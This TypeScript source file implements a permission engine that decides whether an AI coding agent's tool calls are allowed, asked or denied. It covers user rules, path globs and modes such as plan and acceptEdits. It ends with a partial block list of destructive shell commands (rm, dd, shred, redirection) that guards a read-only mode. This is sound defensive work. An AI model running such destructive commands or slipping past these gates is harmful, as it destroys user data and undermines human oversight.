/**
 * PiPermissionEngine — pure, engine-neutral tool-gating decision for pi.
 *
 * pi has no native permission system (docs/protocol-pi/README.md
 * "Extensions"); PiSession.gateToolCall calls `decide()` on every `tool_call`
 * hook invocation with the session's live mode + the user's merged Claude
 * permission rules + a per-session "always allow" set, and turns the result
 * into an allow/deny/ask response for PiBridgeHost.
 *
 * Mirrors ADR-022's opencode ruleset semantics with an EVALUATOR instead of a
 * compiled ruleset (opencode patches a ruleset onto its own server; pi has no
 * server-side permission concept to patch, so ClaudeUI evaluates the same
 * rules itself, per tool_call, entirely in the main process).
 */
import path from 'node:path'
import { homedir } from 'node:os'
import type { ToolKind } from '../../shared/tool-kinds'
import { hostedMcpKind } from '../../shared/tool-kinds'
import type { ClaudePermissions, PermissionScope } from '../../shared/types'
import { loadClaudePermissions } from '../services/claude-settings'
import { parseClaudeRule } from '../opencode/permission-compiler'
import { isAgentControlTarget } from '../automode/agent-control-paths'
import { allowCovers, denyAskHit, type DenyAskHit } from '../permissions/shell-rules'
import { readOnlyVerdict } from '../automode/read-only'
import { hostRealpath } from '../automode/read-only-gate'
import { logger } from '../services/logger'

export type PermissionDecision = 'allow' | 'ask' | 'deny'

/**
 * WHICH rung of `decide()`'s ladder produced the verdict. Provenance, not a
 * second decision: `decide()` collapses this away and is unchanged.
 *
 * The load-bearing case is `'ask-rule'` — auto mode (phase 4 of
 * `docs/automode-rework-plan.md`) must send an ask the USER authored straight
 * to the human rather than letting the classifier auto-approve it (G9 / ref §3
 * step 1), and an `'ask'` decision alone cannot tell a user rule from the mode
 * base. pi is the engine that CAN answer this natively — opencode discards the
 * matched rule before publishing `permission.asked`, so its wiring has to
 * re-match host-side (`opencode/wildcard.ts`); here the evaluator IS ours, so
 * we simply report what it matched.
 */
export type PermissionDecisionSource =
  'deny-rule' | 'hosted-auto-allow' | 'ask-rule' | 'session-allow' | 'allow-rule' | 'mode-base'

export interface PermissionVerdict {
  decision: PermissionDecision
  source: PermissionDecisionSource
  /** The user-authored Claude rule string that matched, for the rule-sourced verdicts. */
  rule?: string
}

/** The merged (user + project + local scope) Claude permission rule set. Same shape as ClaudePermissions — merging three scopes together yields no new fields. */
export type MergedClaudeRules = ClaudePermissions

export interface PermissionEngineContext {
  /** Claude-style permission-mode string, as arrives at PiSession.setPermissionMode: 'default' | 'acceptEdits' | 'plan' | 'auto' | ... */
  mode: string
  rules: MergedClaudeRules
  /** "Allow for this session" entries: bare pi tool name (e.g. 'edit'), or `bash:<normalized command>` for bash. */
  sessionAllows: ReadonlySet<string>
  /**
   * The session's working directory — lets `ruleMatchesTool` resolve a
   * path-bearing tool call's `path`/`file_path` argument (pi's own tool
   * schemas document it as "relative or absolute", model's choice —
   * verified against pi-mono's tools/{edit,write,read,grep,find,ls}.ts
   * `Type.Object` schemas) into the SAME canonical form opencode's real
   * server-side matcher compares against: the path relative to cwd
   * (vendor/opencode-src/packages/opencode/src/tool/read.ts —
   * `path.relative(instance.worktree, filepath)`, mirrored identically by
   * edit.ts/write.ts). See `resolveMatchPath`.
   *
   * Optional: `PiSession.gateToolCallInner` passes `this.cwd`, and so does
   * the cross-engine-dispatcher's `gatePiTargetToolCall` (its rules are the
   * user's deny/ask tiers only, ADR-085 §3, and the acceptEdits base's
   * agent-control-path check — ADR-084 §3, `editsAgentControlPath` — resolves
   * the path against it).
   * Any caller that omits it falls back to matching the RAW input path
   * (best-effort — see `resolveMatchPath`'s doc comment).
   *
   * In plan mode it also enables the second read-only oracle
   * ({@link isPlanReadOnlyCommand}); without it only pi's plan-safe list decides.
   */
  cwd?: string
  /** Path semantics for plan mode's second read-only oracle. Tests inject; sessions default to the host (`process.platform`). */
  platform?: NodeJS.Platform
  /** realpath for plan mode's second read-only oracle. Tests inject; sessions default to the host (`hostRealpath`). */
  realpath?: PlanReadOnlyScope['realpath']
  /**
   * How a Claude MCP rule's tool name is spelled in THIS engine's tool names
   * before it is compared (ADR-096). pi sanitizes `mcp__<server>__<tool>` to
   * `[A-Za-z0-9_]` (`mcp__my-server__x` is called `mcp__my_server__x`), so pi's
   * gates pass `piMcpRuleKey` and a rule written for Claude matches pi's call.
   * Absent = compared as written (Codex names MCP calls in Claude's own form).
   */
  mcpRuleKey?: (ruleTool: string) => string
}

// ---------------------------------------------------------------------------
// piToolKind — SAME mapping as the renderer's PiEngineToolMap.kindOf
// ---------------------------------------------------------------------------

/**
 * Mirrors `PiEngineToolMap.kindOf` (src/renderer/.../PiEngineToolMap.ts) for
 * this engine's mode-base decisions. Main cannot import renderer code (they
 * are separate Electron processes/bundles), so this switch is intentionally
 * DUPLICATED here rather than shared — PiEngineToolMap.test.ts asserts the two
 * tables agree for every known pi tool name (single-source guard): a change to
 * one without the other fails that test.
 */
export function piToolKind(toolName: string): ToolKind {
  const mcpKind = hostedMcpKind(toolName)
  if (mcpKind !== null) return mcpKind

  switch (toolName) {
    case 'bash':
      return 'command'
    case 'edit':
      return 'fileEdit'
    case 'write':
      return 'fileWrite'
    case 'read':
      return 'fileRead'
    case 'grep':
    case 'find':
    case 'ls':
      return 'search'
    // Plan mode (M5a): the bridge extension's locally-executed exit_plan
    // tool (pi-bridge-source.ts, gated on CLAUDEUI_PI_PLAN_TOOLS) — reuses
    // the SAME 'plan' kind Claude's ExitPlanMode maps to (tool-kinds.ts),
    // so it gets its own mode-base treatment (planModeBaseDecision below)
    // and renders ExitPlanModeCard on the renderer side. Mirrors
    // PiEngineToolMap.kindOf's IDENTICAL case — the single-source guard
    // test (PiEngineToolMap.test.ts) asserts the two tables agree.
    case 'exit_plan':
      return 'plan'
    // Hosted tools (M4a+b) registered via pi.registerTool() in the bridge
    // extension use BARE names — hostedMcpKind above only matches `mcp__*`
    // prefixed names, so these need explicit cases here too. Mirrors
    // PiEngineToolMap.kindOf's IDENTICAL cases (renderer side) — the
    // single-source guard test (PiEngineToolMap.test.ts) asserts the two
    // tables agree for every known pi tool name.
    case 'render_mermaid':
      return 'diagram'
    case 'create_mockup':
    case 'show_mockup':
      return 'mockup'
    case 'dispatch_agent':
      return 'task'
    // Host-run pi subagents (ADR-089): the bridge's own `agent` tool
    // (pi-bridge-source.ts v9, gated on CLAUDEUI_PI_AGENT_TOOL) — the SAME
    // 'task' kind dispatch_agent uses (TaskCard is engine-neutral). Mirrors
    // PiEngineToolMap.kindOf's IDENTICAL case (single-source guard test).
    case 'agent':
      return 'task'
    // `subagent`: legacy M5b transcripts (the retired in-pi extension) and
    // pi's upstream example subagent extension a user may load themselves.
    // Same 'task' kind; mirrored in PiEngineToolMap.kindOf.
    case 'subagent':
      return 'task'
    // ADR-089 S3b: the bridge's `send_message` / `task_stop` — Claude's
    // SendMessage / TaskStop row kinds. Mirrored in PiEngineToolMap.kindOf.
    case 'send_message':
      return 'detail'
    case 'task_stop':
      return 'note'
    // The bridge's `list_models` (read-only; a one-line note row).
    case 'list_models':
      return 'note'
    default:
      return 'unknown'
  }
}

// ---------------------------------------------------------------------------
// Hosted-tool auto-allow (M4a)
// ---------------------------------------------------------------------------

/**
 * Hosted LLM tools (M4a) — ClaudeUI's own render_mermaid/create_mockup/
 * show_mockup, registered via pi.registerTool() over the bridge (see
 * pi-bridge-source.ts + PiBridgeHost's /hosted-tool route). ALWAYS ALLOWED —
 * parity with Claude's auto-allowed `mcp__claude-ui__` prefix and opencode's
 * silent `{*:allow}` baseline for the same tools. Checked in decide() AFTER
 * deny rules (a user's explicit deny still wins — see decide()'s doc
 * comment) but BEFORE ask/sessionAllows/allow/mode-base, so these three
 * never prompt or fall through the ladder. `list_models` (ADR-089: the models
 * an `agent` call may name) rides the same rung: read-only, so never a card.
 *
 * `dispatch_agent` is deliberately NOT in this set: it gets NORMAL gating
 * (falls through to mode base), matching Claude routing dispatch_agent
 * through its own separate, non-auto-allowed `claude-ui-collab` MCP server
 * (collab-tool.ts) rather than the auto-allowed `claude-ui` one.
 */
export const PI_AUTO_ALLOW_HOSTED_TOOLS: ReadonlySet<string> = new Set([
  'render_mermaid',
  'create_mockup',
  'show_mockup',
  // Read-only: lists the models an `agent` call may name (a deny rule still wins).
  'list_models'
])

/**
 * EVERY tool registered via `pi.registerTool()` in the bridge extension that
 * executes over `/hosted-tool` (M4a+b, plus ADR-088's `agent`) —
 * PI_AUTO_ALLOW_HOSTED_TOOLS above is a STRICT SUBSET (the three auto-allowed
 * ones; `dispatch_agent` and `agent` get normal gating instead, see
 * PI_AUTO_ALLOW_HOSTED_TOOLS' doc comment for why — `agent`'s gate is
 * PiSession's spawn-call rung, ADR-089 Q1). PiSession's
 * gateToolCall wrapper checks THIS superset — not the auto-allow set — to
 * decide which allow decisions mint a one-shot `/hosted-tool` execution grant
 * (security fix: a call outside this set has no `/hosted-tool` counterpart to
 * ever execute, so no grant is needed or minted for it).
 */
export const PI_HOSTED_TOOL_NAMES: ReadonlySet<string> = new Set([
  'render_mermaid',
  'create_mockup',
  'show_mockup',
  'dispatch_agent',
  'agent',
  'send_message',
  'task_stop',
  'list_models'
])

// ---------------------------------------------------------------------------
// Claude rule string -> pi kind mapping (for evaluating the user's rules)
// ---------------------------------------------------------------------------

/**
 * Claude canonical tool name -> pi ToolKind, for matching the user's
 * Tool(specifier) rule strings against a pi tool_call. LS is included
 * alongside Grep/Glob (all three collapse to pi's single 'search' kind,
 * pi's `ls`/`grep`/`find` tools) for parity with opencode's own
 * TOOL_TO_CATEGORY table (permission-compiler.ts), which treats Read/Glob/
 * Grep/LS as siblings. Any Claude tool name NOT in this table (WebFetch,
 * Task, NotebookEdit, MultiEdit, ...) has no pi analog and never matches.
 */
const CLAUDE_TOOL_TO_KIND: Record<string, ToolKind> = {
  Bash: 'command',
  Edit: 'fileEdit',
  Write: 'fileWrite',
  Read: 'fileRead',
  Grep: 'search',
  Glob: 'search',
  LS: 'search'
}

/** Reverse of the above, for building "always allow" suggestions from a pi tool_call (PiSession). */
export const PI_TOOL_TO_CLAUDE_TOOL: Record<string, string> = {
  bash: 'Bash',
  edit: 'Edit',
  write: 'Write',
  read: 'Read',
  grep: 'Grep',
  find: 'Glob',
  ls: 'LS'
}

/** Trim + collapse internal whitespace runs, for comparing bash commands. */
export function normalizeWhitespace(s: string): string {
  return s.trim().replace(/\s+/g, ' ')
}

function commandOf(input: Record<string, unknown>): string {
  return String(input.command ?? '')
}

// ---------------------------------------------------------------------------
// Path-glob specifier matching (path-bearing Claude rules: Edit(src/**),
// Read(docs/**), Write(...), and Grep/Glob/LS path scoping)
// ---------------------------------------------------------------------------

/**
 * Claude/opencode-compatible glob matcher — a faithful PORT of opencode's own
 * `Wildcard.match` (vendor/opencode-src/packages/core/src/util/wildcard.ts).
 * That function is what opencode's REAL server uses to compare a tool's
 * concrete path against a compiled rule's `pattern` — NOT
 * `../opencode/permission-compiler.ts` (checked first): that module only
 * rewrites Claude `Tool(specifier)` rule STRINGS into opencode's
 * `{permission,pattern,action}` shape, passing specifiers through verbatim
 * (see its `translateSpecifier` — file globs "pass through"). The actual
 * glob MATCHING happens inside the spawned `opencode serve` binary and is
 * never imported into ClaudeUI's own bundle, so there is nothing to
 * literally import here — porting this algorithm (rather than inventing a
 * different one) is what gives pi and opencode IDENTICAL results for the
 * same rule string, which is the whole point of this fix.
 *
 * Semantics (read from the vendored source, not guessed):
 *  - `*` -> `.*` — matches ANY run of characters, INCLUDING `/`. There is no
 *    special "single path segment" `*` vs "any depth" `**` distinction the
 *    way shell/minimatch globs have one — `**` degrades to two consecutive
 *    `.*` (still just "match anything"), so `src/**` and `src/*` behave
 *    identically under this matcher.
 *  - `?` -> `.` (single char).
 *  - Both the concrete input and the rule pattern are backslash-normalized
 *    (`\` -> `/`) before comparing, so a Windows-style input path matches a
 *    `/`-separated rule glob.
 *  - Case sensitivity is PLATFORM-DEPENDENT: case-insensitive (regex `i`
 *    flag) only when `process.platform === 'win32'`, case-sensitive
 *    everywhere else — ported verbatim (not simplified), so pi on Windows
 *    (this dev platform) matches opencode on Windows exactly.
 *  - `s` (dotAll) is always set, so `.` (from escaping literal chars) and
 *    `.*` also match embedded newlines.
 */
export function claudeGlobMatches(input: string, pattern: string): boolean {
  const normalized = input.replaceAll('\\', '/')
  let escaped = pattern
    .replaceAll('\\', '/')
    .replace(/[.+^${}()|[\]\\]/g, '\\$&')
    .replace(/\*/g, '.*')
    .replace(/\?/g, '.')
  // Ported verbatim from Wildcard.match, including this narrow trailing-
  // " *"-pattern carve-out (opencode uses it for its own task/subagent-type
  // matching; a no-op for ordinary path globs, kept for byte-for-byte
  // fidelity with the source we're mirroring).
  if (escaped.endsWith(' .*')) escaped = escaped.slice(0, -3) + '( .*)?'
  return new RegExp('^' + escaped + '$', process.platform === 'win32' ? 'si' : 's').test(normalized)
}

/** Path-bearing pi kinds — the only ones a path-glob specifier can meaningfully match against. */
const PATH_BEARING_KINDS: ReadonlySet<ToolKind> = new Set<ToolKind>([
  'fileEdit',
  'fileWrite',
  'fileRead',
  'search'
])

/**
 * Extract the path argument pi's tool_call input carries for a path-bearing
 * kind. `edit`/`write`/`read` carry `path` (pi-mono's tools/{edit,write,
 * read}.ts `Type.Object` schemas, confirmed against the published source —
 * `edit.ts` additionally accepts a legacy `file_path` alias at its OWN
 * argument-prep step; it's unspecified whether that normalization has
 * already run by the time the `tool_call` hook fires, so this checks BOTH
 * defensively). `grep`/`find`/`ls` carry `path` too (the search ROOT
 * directory, optional — defaults to cwd when omitted; confirmed against
 * pi-mono's tools/{grep,find,ls}.ts schemas).
 */
function extractToolPath(input: Record<string, unknown>): string | undefined {
  const path = input.path
  if (typeof path === 'string' && path.length > 0) return path
  const filePath = input.file_path
  if (typeof filePath === 'string' && filePath.length > 0) return filePath
  return undefined
}

/**
 * Resolve a tool's raw path argument to the SINGLE canonical form matched
 * against a rule's glob specifier — mirrors opencode's real behavior exactly
 * (vendor/opencode-src's read.ts/edit.ts/write.ts: resolve to absolute
 * against the working directory if relative, then `path.relative(worktree,
 * absolute)`) rather than trying the raw AND cwd-relative forms and OR-ing
 * them together: an OR would let an ALLOW rule over-match (e.g. an absolute
 * path that happens to textually contain `src/**`'s literal characters
 * matching a glob it was never meant to cover) — the worst possible
 * direction for a permission gate to be wrong in.
 *
 * An absolute path OUTSIDE `cwd` relativizes to a `../`-prefixed string,
 * which correctly fails a plain relative glob like `src/**` — this is the
 * additionalDirectories/external-directory case; see this file's
 * `additionalDirectories` deferral comment on `MergedClaudeRules`.
 *
 * `cwd` absent falls back to matching the RAW path as-is (backslash-
 * normalized only), best-effort — documented, not silently pretended to be
 * correct. Every real caller threads `cwd` (`PiSession.gateToolCallInner`,
 * the dispatcher's `gatePiTargetToolCall`).
 *
 * Path FLAVOR (win32 vs posix semantics) follows `cwd`'s own syntax — NOT
 * the host platform running this process. A session's `cwd` is a string
 * captured from wherever pi is actually running (could be a Windows path
 * even when ClaudeUI's main process itself runs on macOS/Linux, e.g. in a
 * test or a remote/WSL-adjacent setup); using `node:path`'s host-default
 * `isAbsolute`/`resolve`/`relative` would treat a Windows absolute path
 * (`D:\repo`, `\\server\share`) as a RELATIVE posix path on a non-Windows
 * host, silently breaking containment. `looksWindowsAbsolute` recognizes a
 * drive-letter (`D:\` / `D:/`) or UNC (`\\server\share`) prefix; everything
 * else uses posix semantics (a plain `/repo`-style cwd, or a bare relative
 * cwd, which posix treats the same way any reasonable default would).
 */
function looksWindowsAbsolute(p: string): boolean {
  return /^[a-zA-Z]:[\\/]/.test(p) || p.startsWith('\\\\')
}

/** win32 vs posix path semantics, keyed on `cwd`'s own syntax — see `resolveMatchPath`'s doc comment for why NOT the host platform. */
function pathFlavor(cwd: string): typeof path.win32 {
  return looksWindowsAbsolute(cwd) ? path.win32 : path.posix
}

/** The tool's raw path argument resolved against `cwd` (flavor-aware), still in the flavor's native separator form. */
function toAbsolutePath(rawPath: string, cwd: string): string {
  const flavor = pathFlavor(cwd)
  const normalizedRaw = flavor === path.win32 ? rawPath : rawPath.replaceAll('\\', '/')
  // `normalize` rather than `resolve` for the already-absolute case: identical
  // result, minus any chance of consulting the HOST process's cwd.
  return flavor.isAbsolute(normalizedRaw)
    ? flavor.normalize(normalizedRaw)
    : flavor.resolve(cwd, normalizedRaw)
}

function resolveMatchPath(rawPath: string, cwd: string | undefined): string {
  if (!cwd) return rawPath.replaceAll('\\', '/')
  return pathFlavor(cwd).relative(cwd, toAbsolutePath(rawPath, cwd)).replaceAll('\\', '/')
}

// ---------------------------------------------------------------------------
// Absolute / home-dir rule specifiers
// ---------------------------------------------------------------------------

/**
 * Canonical form for an ABSOLUTE path or glob — forward slashes plus an
 * upper-cased drive letter. Both sides of an absolute comparison go through
 * this, so `d:\secrets\x` and `D:/secrets/x` compare equal even on a
 * case-SENSITIVE host (claudeGlobMatches only sets the regex `i` flag when
 * `process.platform === 'win32'`, mirroring opencode; a Windows-flavored cwd
 * on a posix host is a real configuration — see `resolveMatchPath`). Only the
 * drive letter is case-folded: the rest of the path keeps the platform-keyed
 * sensitivity the relative branch has always had.
 */
function normalizeAbsolute(p: string): string {
  const slashed = p.replaceAll('\\', '/')
  return /^[a-z]:/.test(slashed) ? slashed[0].toUpperCase() + slashed.slice(1) : slashed
}

/**
 * Claude Code's Windows absolute rule `//c/rest` (cli.js writes `C:/x` that way
 * and reads it back as drive `C:` + `/rest`); `//c` is the drive root. cli.js
 * does not recognise `//C:/rest`, but accepting it only ever tightens a deny.
 * Only a single-letter first segment is a drive. Null for anything else.
 */
function windowsDriveRule(specifier: string): string | null {
  const match = /^\/\/([A-Za-z]):?(?:[\\/](.*))?$/.exec(specifier)
  return match ? `${match[1].toUpperCase()}:/${match[2] ?? ''}` : null
}

/**
 * RULE-side normalisation: does this specifier denote an ABSOLUTE location,
 * and if so what glob does it become? Returns null for an ordinary
 * cwd-relative glob (`src/**`), whose semantics are deliberately untouched.
 *
 * `resolveMatchPath` always relativises the TOOL path against cwd, but rule
 * specifiers were matched verbatim — so every absolute-looking specifier was
 * compared against a relative string and could NEVER match. `Edit(~/.ssh/**)`,
 * `Read(//etc/shadow)` and `Edit(D:\secrets\**)` were inert: the tool ran with
 * no prompt at all, in every mode, silently. Recognised forms:
 *
 *  - `//abs/path/**` — Claude rule syntax marks an absolute path with a
 *    DOUBLED leading slash (a single `/` means "relative to the settings file"
 *    and is left alone here). Strip one slash. On a Windows session (`windows`)
 *    `//c/rest` (and `//C:/rest`) is the drive form `C:/rest`.
 *  - `~` / `~/…` — the user's home directory.
 *  - `X:\…` / `X:/…` / `\\server\share\…` — Windows absolute + UNC.
 *
 * A UNC path written with forward slashes (`//server/share/**`) is read as the
 * Claude `//`-absolute form (→ `/server/share/**`); spell UNC rules with
 * backslashes, as Windows itself does, to get UNC semantics.
 */
function absoluteSpecifierGlob(specifier: string, windows: boolean): string | null {
  if (specifier.startsWith('//')) {
    return normalizeAbsolute((windows ? windowsDriveRule(specifier) : null) ?? specifier.slice(1))
  }
  if (specifier === '~') return normalizeAbsolute(homedir())
  if (specifier.startsWith('~/') || specifier.startsWith('~\\')) {
    return normalizeAbsolute(`${homedir().replace(/[\\/]+$/, '')}/${specifier.slice(2)}`)
  }
  if (looksWindowsAbsolute(specifier)) return normalizeAbsolute(specifier)
  return null
}

/**
 * The tool path in the canonical ABSOLUTE form an `absoluteSpecifierGlob`
 * result is compared against. Without a `cwd` we cannot resolve a relative
 * input, so we fall back to the raw path — the same documented best-effort
 * `resolveMatchPath` uses (an absolute input still matches correctly there).
 */
function resolveAbsoluteMatchPath(rawPath: string, cwd: string | undefined): string {
  return normalizeAbsolute(cwd ? toAbsolutePath(rawPath, cwd) : rawPath)
}

const MCP_RULE_PREFIX = 'mcp__'

/**
 * Claude's MCP rule vocabulary, the one tier of the ladder whose rules are not
 * `Tool(specifier)` at all: `mcp__<server>` names every tool on one server and
 * `mcp__<server>__<tool>` names one tool, and neither takes a specifier.
 * `mcp__<server>__*` is the server form too (cli.js reads a `*` tool name as
 * "every tool on the server"), so a trailing `__*` is dropped first. The
 * rule string IS the tool name the engine is asked about, so these are matched
 * against the NAME rather than through {@link CLAUDE_TOOL_TO_KIND} (which lists
 * only the seven tools with a pi analogue, and so made every `mcp__…` rule a
 * user wrote inert in every tier).
 *
 * Codex gates its MCP tool approvals through this ladder under exactly these
 * names (ADR-067 / `codex/mcp-elicitation.ts`), including the server-only name
 * the gate falls back to when the elicitation does not name a tool; pi's own
 * `mcp__*` tool calls now honour the same rules, which they never did before.
 */
function mcpRuleMatches(
  parsed: { tool: string; specifier?: string },
  toolName: string,
  ruleKey: ((ruleTool: string) => string) | undefined
): boolean {
  // `Tool()` / `Tool(*)` already collapsed to a bare rule in parseClaudeRule; a
  // rule that still carries a specifier is asking for something Claude's MCP
  // syntax cannot express, and inventing a meaning for it here would either
  // over- or under-grant. It matches nothing, exactly as it did before.
  if (parsed.specifier !== undefined) return false
  const bare = parsed.tool.endsWith('__*') ? parsed.tool.slice(0, -3) : parsed.tool
  // The engine's spelling of the rule (pi: its sanitizer), applied AFTER the
  // server-form `__*` is dropped so the wildcard is never sanitized into a name.
  const rule = ruleKey ? ruleKey(bare) : bare
  return toolName === rule || toolName.startsWith(`${rule}__`)
}

/**
 * Does a single Claude rule string match this pi tool_call? Bare tool rules
 * (no specifier) match unconditionally for the mapped kind. The COMMAND kind
 * never comes through here: `decideWithSource` matches every Bash tier as a
 * whole with ADR-085's matcher (`../permissions/shell-rules`), so there is one
 * Bash path per tier. Path-bearing
 * specifiers (Edit/Write/Read/Grep/Glob/LS) are evaluated as path globs
 * against the tool call's path argument — cwd-relative for an ordinary glob
 * (`resolveMatchPath`), absolute for an absolute/home/Windows-absolute
 * specifier (`absoluteSpecifierGlob` + `resolveAbsoluteMatchPath`), both via
 * `claudeGlobMatches` — this also covers Grep/Glob "search pattern"
 * specifiers like `Grep(TODO)`: they're attempted as a path glob against the
 * search-root `path` field, which a bare search-TERM string essentially
 * never coincidentally matches as a directory glob, so they fall through to
 * the mode base exactly as before (never default-allow) — WITHOUT a
 * separate logged "skip" path, since this is now a real (if usually
 * non-matching) evaluation rather than a silent gap.
 */
function ruleMatchesTool(
  rule: string,
  kind: ToolKind,
  toolName: string,
  input: Record<string, unknown>,
  cwd: string | undefined,
  mcpRuleKey?: (ruleTool: string) => string
): boolean {
  const parsed = parseClaudeRule(rule)
  if (!parsed) return false
  if (parsed.tool.startsWith(MCP_RULE_PREFIX)) return mcpRuleMatches(parsed, toolName, mcpRuleKey)
  const mappedKind = CLAUDE_TOOL_TO_KIND[parsed.tool]
  if (!mappedKind || mappedKind !== kind) return false

  if (parsed.specifier === undefined) return true

  if (PATH_BEARING_KINDS.has(mappedKind)) {
    const rawPath = extractToolPath(input)
    // No usable path on the input -> the rule cannot match. Never
    // default-allow on a missing path (hard rule).
    if (rawPath === undefined) return false
    // An absolute/home/Windows-absolute specifier is matched against the
    // ABSOLUTE tool path; everything else keeps the cwd-relative semantics
    // (which is what opencode's real server-side matcher compares against).
    // `//c/x` is a drive on a Windows session (cwd's own syntax, as in
    // `pathFlavor`; the host platform only when there is no cwd).
    const absoluteGlob = absoluteSpecifierGlob(
      parsed.specifier,
      cwd ? looksWindowsAbsolute(cwd) : process.platform === 'win32'
    )
    if (absoluteGlob !== null) {
      return claudeGlobMatches(resolveAbsoluteMatchPath(rawPath, cwd), absoluteGlob)
    }
    return claudeGlobMatches(resolveMatchPath(rawPath, cwd), parsed.specifier)
  }

  // No other pi kind carries a specifier-matchable argument (plan/task/
  // diagram/mockup/mcp/unknown) — never matches.
  return false
}

/** The "allow for this session" dedup key for a tool_call — bash is scoped by its (normalized) command, everything else by bare tool name. */
export function sessionAllowKey(toolName: string, input: Record<string, unknown>): string {
  if (toolName === 'bash') return `bash:${normalizeWhitespace(String(input.command ?? ''))}`
  return toolName
}

/**
 * Does this edit/write target an agent-control path (ADR-084 §3)? Resolution
 * against cwd (relative inside it, absolute outside it) is the shared
 * `isAgentControlTarget`, which opencode's auto-mode edit gate uses too.
 *
 * No path at all → false: pi's edit/write schemas require one, so such a call
 * writes nothing.
 */
function editsAgentControlPath(input: Record<string, unknown>, cwd: string | undefined): boolean {
  const rawPath = extractToolPath(input)
  return rawPath !== undefined && isAgentControlTarget(rawPath, cwd)
}

// ---------------------------------------------------------------------------
// Mode base
// ---------------------------------------------------------------------------

/**
 * Mode-base decision BEFORE user rules / sessionAllows are considered:
 *  - kind 'plan' (exit_plan) OUTSIDE mode 'plan' -> deny in EVERY mode —
 *    including full/auto/bypassPermissions' otherwise allow-everything base.
 *    This is full mode's ONE carve-out (M5a addendum): pi.registerTool()
 *    auto-activates the tool, so exit_plan is model-visible from spawn in
 *    every mode until the bridge extension's session_start hook hides it,
 *    and a mode-transition tool must not be model-invocable when there is
 *    no mode to exit (an auto-allowed exit_plan in full mode would return
 *    "Plan approved — proceeding." for a plan that never existed). Mirrors
 *    cli.js never offering ExitPlanMode outside plan mode.
 *  - default            -> fileRead/search allow, everything else ask
 *  - acceptEdits         -> also fileEdit/fileWrite allow, bash/unknown ask —
 *    except an edit/write whose path is an agent-control path (`.git/`,
 *    `.claude/`, CLAUDE.md, hooks, `.vscode/`, …; ADR-084 §3), which asks. In
 *    auto mode (whose base is acceptEdits) that ask reaches the judge; in plain
 *    acceptEdits the human. The same list is rendered into opencode's
 *    acceptEdits ruleset, so both engines draw the line in the same place.
 *  - bypassPermissions/full/auto -> allow everything (except the plan-kind carve-out above)
 *  - plan (M5a — real autonomy mode now, see planModeBaseDecision) -> read-only:
 *    reads/search allow, exit_plan asks, bash gated by isPlanReadOnlyCommand,
 *    everything else (fileEdit/fileWrite/task/unknown/…) denies outright
 *  - any other/unrecognised mode string -> treat as default (fail toward asking, not allowing)
 */
function modeBaseDecision(
  mode: string,
  kind: ToolKind,
  input: Record<string, unknown>,
  cwd: string | undefined,
  planScope?: PlanReadOnlyScope
): 'allow' | 'ask' | 'deny' {
  if (kind === 'plan' && mode !== 'plan') return 'deny'
  switch (mode) {
    case 'bypassPermissions':
    case 'full':
    case 'auto':
      return 'allow'
    case 'acceptEdits':
      if (kind === 'fileEdit' || kind === 'fileWrite') {
        return editsAgentControlPath(input, cwd) ? 'ask' : 'allow'
      }
      return kind === 'fileRead' || kind === 'search' ? 'allow' : 'ask'
    case 'plan':
      return planModeBaseDecision(kind, input, planScope)
    case 'default':
    default:
      return kind === 'fileRead' || kind === 'search' ? 'allow' : 'ask'
  }
}

// ---------------------------------------------------------------------------
// Plan mode (M5a) — read-only autonomy enforced by BOTH the bridge extension
// (pi-bridge-source.ts's exit_plan/cui-plan-enter/cui-plan-exit — the model
// literally never sees edit/write while planning) and this gate (defense in
// depth, and the ONLY place bash gets a command-level allowlist instead of a
// blanket ask/deny). Precedence: an explicit user deny RULE (checked first in
// decide(), see its doc comment) still overrides everything below; for a
// MUTATING call (edit/write, a bash command isPlanReadOnlyCommand cannot vouch
// for) the plan base then outranks the ask tier, session allows and the allow
// tier (ADR-085 ruling 7, planModeOutranksRules); for everything else the
// user's ask/allow rules still override the base. The hosted three
// (render_mermaid/create_mockup/show_mockup) auto-allow before mode base is
// ever consulted — they don't mutate the repo, so they stay available in plan
// mode.
// ---------------------------------------------------------------------------

/**
 * Denial reason for every plan-mode-BASE deny (a mutating kind, or an
 * unsafe/unrecognized bash command) — model-actionable, points it at the
 * exit_plan tool. An explicit user deny RULE produces its OWN, more specific
 * "Denied by permission rule: …" reason (PiSession.gateToolCallInner checks
 * that first) — this is only the mode-base fallback.
 */
export const PLAN_MODE_DENY_REASON =
  'Plan mode is read-only — present a plan and call exit_plan to proceed'

/** The same refusal for the engines with NO exit_plan tool (opencode, Codex — ADR-085 S4, S3b verifier F4):
 *  the user leaves plan mode from the mode picker. opencode's own `plan_exit` (its plan agent's tool) is
 *  model-visible but its "switch to build agent" question does not change ClaudeUI's permission mode. */
export const PLAN_MODE_DENY_REASON_NO_EXIT_TOOL =
  'Plan mode is read-only — present the plan and ask the user to leave plan mode to proceed'

/**
 * Denial reason for an exit_plan call OUTSIDE plan mode (M5a addendum) —
 * pi.registerTool() auto-activates the tool, so exit_plan is model-visible
 * from spawn in every mode until the bridge extension's session_start hook
 * hides it; this gate deny is the backstop. Wired in
 * PiSession.gateToolCallInner the same way PLAN_MODE_DENY_REASON is.
 */
export const PLAN_EXIT_OUTSIDE_PLAN_REASON = 'exit_plan is only available in plan mode'

/**
 * Destructive-anywhere-in-the-string bash patterns — ported from
 * vendor/pi-src/packages/coding-agent/examples/extensions/plan-mode/utils.ts's DESTRUCTIVE_PATTERNS
 * (the pi-shipped reference implementation this milestone's kickoff spec
 * pointed at), with ClaudeUI-specific hardening marked inline below.
 * Unanchored word-boundary matches: a destructive token ANYWHERE in a chained
 * command (`ls && rm -rf /`, `echo hi; git commit -m x`) blocks the WHOLE
 * command. This scan is the FIRST check in isPlanSafeBashCommand; the
 * per-segment safe-list validation below is the second — a chained command
 * must clear both.
 *
 * The vendor list is COMMAND-NAME oriented, which leaves a whole class of
 * mutation invisible to it: a read-only command name carrying a mutating FLAG.
 * The `-delete` / `-exec` / … entries below close that class for the safe-list
 * entries that expose it (`find`). Flag patterns are anchored with `(^|\s)-`
 * so they match a SHORT option only — `--delete` (the long form, e.g.
 * `rsync --delete`, which is not on the safe list anyway) deliberately does
 * not trip them, and neither does a filename that merely contains the word.
 */
const PLAN_DESTRUCTIVE_PATTERNS: RegExp[] = [
  /\brm\b/i,
  /\brmdir\b/i,
  /\bmv\b/i,
  /\bcp\b/i,
  /\bmkdir\b/i,
  /\btouch\b/i,
  /\bchmod\b/i,
  /\bchown\b/i,
  /\bchgrp\b/i,
  /\bln\b/i,
  /\btee\b/i,
  /\btruncate\b/i,
  /\bdd\b/i,
  /\bshred\b/i,
  /(^|[^<])>(?!>)/,
  />>/,
